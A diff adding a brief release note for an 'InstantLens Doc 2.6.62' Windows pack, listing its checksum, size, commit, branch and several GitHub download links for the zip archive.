@@ -1,0 +1,25 @@
+InstantLens Doc 2.6.62 Windows-Pack
+
+SHA256  7e32b31771d3d591fa00d90b9d818c6075ff454a663ba3c6e997940aad353d9c
+Size    2143988 bytes
+Commit  92214c4ee6a195d2df01792013f91ee0e048e3e6
+Branch  cursor/instantlensdoc-2108
+PR      https://github.com/kickmetox/hello-github/pull/3
+
+Direct download (versioned):
+https://raw.githubusercontent.com/kickmetox/hello-github/cursor/instantlensdoc-2108/InstantLensDoc/InstantLensDoc-2.6.62-pack.zip
+
+Alias:
+https://raw.githubusercontent.com/kickmetox/hello-github/cursor/instantlensdoc-2108/InstantLensDoc/InstantLensDoc-pack.zip
+
+Same files at repo root:
+https://raw.githubusercontent.com/kickmetox/hello-github/cursor/instantlensdoc-2108/InstantLensDoc-2.6.62-pack.zip
+https://raw.githubusercontent.com/kickmetox/hello-github/cursor/instantlensdoc-2108/InstantLensDoc-pack.zip
+
+GitHub blob (Download raw file):
+https://github.com/kickmetox/hello-github/blob/cursor/instantlensdoc-2108/InstantLensDoc/InstantLensDoc-2.6.62-pack.zip
+
+Full branch archive (source + pack):
+https://github.com/kickmetox/hello-github/archive/refs/heads/cursor/instantlensdoc-2108.zip
+
+.gitignore does not ignore *.zip. Files are git blobs, not Git LFS.
